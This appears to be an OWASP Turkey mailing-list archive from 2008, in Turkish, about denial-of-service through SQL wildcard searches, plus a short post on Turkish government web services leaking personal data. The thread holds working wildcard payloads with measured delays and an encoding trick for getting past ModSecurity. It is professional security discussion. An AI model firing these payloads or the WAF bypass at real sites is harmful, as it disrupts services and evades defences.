Herkese Selamlar,Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim, burada da hem paylasmak hem de konu hakkinda fikir almak istedim. Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu gosteriyor.Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor, dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem almali gerekli.Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede OWASP Guide da bu konuda bir seyler ekleyebiliriz.Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:http://www.portcullis-security.com/uplds/wildcard_attacks.pdfIyi Calismalar,-- Ferruh Mavitunahttp://ferruh.mavituna.com 

E-mail for the greater good. Join the i'm Initiative from Microsoft.-- Ferruh Mavitunahttp://ferruh.mavituna.com 
_________________________________________________________________
Change the world with e-mail. Join the i?m Initiative from Microsoft.
http://im.live.com/Messenger/IM/Join/Default.aspx?source=EML_WL_ChangeWorld
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080522/d0fd8c01/attachment.html 

From ferruh at mavituna.com  Thu May 22 04:12:18 2008
From: ferruh at mavituna.com (Ferruh Mavituna)
Date: Thu, 22 May 2008 09:12:18 +0100
Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
In-Reply-To: <BAY104-W12F97CB890B58CA2FE0042D6C60@phx.gbl>
References: <6dc88c3c0805190524w48664d3bvbd57e8b6750ed386@mail.gmail.com>
	<BAY104-W22026B70C99FE6E76B00C7D6C40@phx.gbl>
	<6dc88c3c0805200703m2ced3cc4j323eb2fee97e4a48@mail.gmail.com>
	<BAY104-W12F97CB890B58CA2FE0042D6C60@phx.gbl>
Message-ID: <6dc88c3c0805220112gafd9a9epfdf0446d65783ba7@mail.gmail.com>

Merhaba,

20 sn. harikaymis, ek olarak bu kadar cabuk etkisini gormus olmaniz da
harika.

. Aramanin hangi field'lar da yapildigi. Mesela metin (text,
> blob) sutunlarda arama yapiliyorsa yukaridaki gecerli. Sadece varchar(~50)
> gibi sutunlarda arama yapan yerlerde (ASP.NET->MSSQL) bu teknikleri kararli
> kullanamadim simdiye kadar. Hatta bu farkliliga gore bile payloadlar
> degistirilebilir. Belki fuzzer gibi bisey kullanmak lazim.


Arama field i cok kritik acikcasi ben hic bir (n)varchar alanda adam gibi
sonuc alamadim, pek mumkun oldugunu da sanmiyorum, eger sonuc alabilen
olursa duymak isterim, belki bir yolu vardir.

Bu arada senin payload' da guzelmis, ben de bilinen ve onceden calistigi
gorulen payloadlarin bir listesini yapmaya basladim daha sonradan bu listeyi
fuzzerlar ile kullanabiliriz ve islemi otomasyona dokebiliriz.

2008/5/22 Bedirhan Urgun <urgunb at hotmail.com>:

>
> Merhaba,
> Dun ve bugun test ettigimiz sistemlerde, Ferruh'un makalesindeki teknikleri
> denedik.
>
> Yazida da belirttigi gibi en onemli nokta "denemek". Cunku her payload
> (sorgu bolumu) her durumda iyi sonuclar vermiyor. Yeni bi tane bulmak
> gerekebiliyor. Mesela bi sayfada asagidaki yeni payload tek istekte ~20sn
> tutuyor, character negation trick ;)
>
> %n[^n]y[^j]l[^k]d[^l]h[^z]t[^k]b[^q]t[^q][^n]!%
>
> Ama onemli olan bi nokta daha var. Aramanin hangi field'lar da yapildigi.
> Mesela metin (text, blob) sutunlarda arama yapiliyorsa yukaridaki gecerli.
> Sadece varchar(~50) gibi sutunlarda arama yapan yerlerde (ASP.NET->MSSQL) bu
> teknikleri kararli kullanamadim simdiye kadar. Hatta bu farkliliga gore bile
> payloadlar degistirilebilir. Belki fuzzer gibi bisey kullanmak lazim.
>
> bedirhan
>
> ------------------------------
> Date: Tue, 20 May 2008 15:03:16 +0100
> From: ferruh at mavituna.com
> To: urgunb at hotmail.com
> Subject: Re: [Owasp-turkey] DoS attacks using SQL Wildcards
> CC: owasp-turkey at lists.owasp.org
>
>
> Merhabalar,
>
> Tesekkurler Bedirhan, paylastiginiz nokta ilgincmis benim modsecurity hic
> aklima gelmemisti o sirada. Ek olarak payload cok daha farkli sekillerde de
> yapilabilir, senin gosterdigin ve buldugunuz yontem de bunun gibi.
>
> Mesela benim gene dokumanda verdigim basit bir ornek var : _[r/a)_ _(r/b)_
> _(r-d)_
>
> Gayet kisa ve benim testimdeki bir web forum yaziliminda 30+ sn. suruyor
> calismasi :), yazilim detaylarini burada veremiyorum, kendilerine de acik
> olarak bildirdim zaten ama sadece durumun vehametini ortaya koymak adina. Bu
> yazilimda mesela 15 karakter gibi bir limit vardi, ama ona ragment
> yukaridaki basit arama yetti.
>
> Bu arada karsimiza geldiginde bypass edebilmek icin bu double encoding
> olayini akilda tutmak lazim.
>
> 2008/5/20 Bedirhan Urgun <urgunb at hotmail.com>:
>
>
>  merhaba,
> tebrik ederim Ferruh.
>
> Yazidaki teknik ile alakali olarak bugun Yusuf ?eri ile farkettigimiz bi
> noktayi paylasmak istedim. Eger modsecurity ile korunan sisteminiz (veya
> baska bir WAF), yazida belirtilen asagidaki payloadu reddiyorsa
>
> '%_[^!_%/%a?F%_D)_(F%)_%([)({}%){()}?$&N%_)$*?()$*R"_)][%](%[x])%a][$*"?$-9]_%'
>
>
> bu saldiriya acik degiliz anlamina gelmiyor. Yukaridaki payload'un basit
> bir bypass teknigi uygulanmis hali;
>
>
> '%64_[^!_%65/%aa?F%64_D)_(F%64)_%36([)({}%33){()}?$&N%55_)$*?()$*R"_)][%55](%66[x])%ba][$*"?$-9]_%54'
>
> Yani payloaddaki % yerine gecerli bir url encoded karakter giriliyor (ascii
> 32'den buyuk olmasi daha iyi cunku 0-32 [non-printables] arasi reddediliyor
> olarak ayarlanmis olabilir ilgili WAF'da).
>
> Peki arkada donen ne? modsec hatirladigim kadari ile "double encoding"
> saldirilarini engellemek icin aldigi input'u bir daha decode edip, URL
> denetimini bir daha gercekliyor. Ve boylece mesela
>
> %a -> %25a -> modsec -> %25a (gecerli URL encoding) -> %a (*gecersiz *URL
> encoding) = istek reddedilir
>
> ama by-pass teknigi ile
>
> %aa -> %25aa -> modsec -> %25aa (gecerli URL encoding) -> %aa (*gecerli *URL
> ending) = istek onaylanir
>
>
> bedirhan
>
> ------------------------------
> Date: Mon, 19 May 2008 13:24:29 +0100
> From: ferruh at mavituna.com
> To: owasp-turkey at lists.owasp.org
> Subject: [Owasp-turkey] DoS attacks using SQL Wildcards
>
>
> Herkese Selamlar,
>
> Bir sure once uzerinde calistigim yazimi bitirdim ve yayinlayabildim,
> burada da hem paylasmak hem de konu hakkinda fikir almak istedim.
>
> Ozetle veritabanina sahip web uygulamalarin arama sayfalari ve benzer
> sayfalari kullanarak DoS saldirilari yapmanin yeni bir yolunu gosteriyor.
> Kritik nokta su ki inanilmaz sayida web uygulamasi bundan etkileniyor,
> dolayisiyla gelsitiricilerin ozellikle bir an once buna karsi onlem almali
> gerekli.
>
> Ikinci olarak penetration test yapan arkadaslarin da bu saldiriyi test
> metodolojilerine eklemeleri yerinde olacaktir. Insallah uzun vadede OWASP
> Guide da bu konuda bir seyler ekleyebiliriz.
>
> Maalesef henuz Turkcesi yok, yazi suradan download edilebilir:
>
> http://www.portcullis-security.com/uplds/wildcard_attacks.pdf
>
>
>
> Iyi Calismalar,
>
> --
> Ferruh Mavituna
> http://ferruh.mavituna.com
>
> ------------------------------
> E-mail for the greater good. Join the i'm Initiative from Microsoft.<http://im.live.com/Messenger/IM/Join/Default.aspx?source=EML_WL_+GreaterGood>
>
>
>
>
> --
> Ferruh Mavituna
> http://ferruh.mavituna.com
>
>
> ------------------------------
> Change the world with e-mail. Join the i'm Initiative from Microsoft.<http://im.live.com/Messenger/IM/Join/Default.aspx?source=EML_WL_ChangeWorld>
>



-- 
Ferruh Mavituna
http://ferruh.mavituna.com
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080522/63a8c1cd/attachment.html 

From urgunb at hotmail.com  Sat May 31 13:27:38 2008
From: urgunb at hotmail.com (Bedirhan Urgun)
Date: Sat, 31 May 2008 13:27:38 -0400
Subject: [Owasp-turkey] PII Turkiye
Message-ID: <BAY104-W30185D3C0755B0EEA37BEAD6B90@phx.gbl>

 
 
Merhabalar,
Bir arkadasim asagidaki linki gonderdi.
 
http://www.ankaraajans.com/arsiv/adsoyad.html
 
Aslinda herkesin az cok bildigi bir konu ama zaman bulup arastirmak ve yaziya dokmek baska bisey. Herneyse, konu web servislerinden bazilarini kullanarak kisisel bilgilerin bulunabilmesi ile alakali. (Basit bilgiler ile aratip butun bilgilerini gorunce insan bi garip oluyor). Ozellikle SSK ve Bagkur web servisleri "iste E-Devlet bu olsa gerek" dedirtiyor :). 
 
Aklima su sorular geldi. Bu servisler hem guvenli olup hem islevselligini nasil koruyabilir, koruyabilir mi? Bu tur web servileri icin bir standard var mi? Diger ulkelerde bu servislerin (ssk, bagkur sorgulama mesela) muadilleri var mi?
 
PII: Personally Identifiable Information (www.webguvenligi.org/sozluk adresinde "ki?isel tan?mlay?c? bilgi" olarak tanimlanmis).
 
bedirhan
_________________________________________________________________
Keep your kids safer online with Windows Live Family Safety.
http://www.windowslive.com/family_safety/overview.html?ocid=TXT_TAGLM_WL_Refresh_family_safety_052008
-------------- next part --------------
An HTML attachment was scrubbed...
URL: https://lists.owasp.org/pipermail/owasp-turkey/attachments/20080531/749637c9/attachment.html 

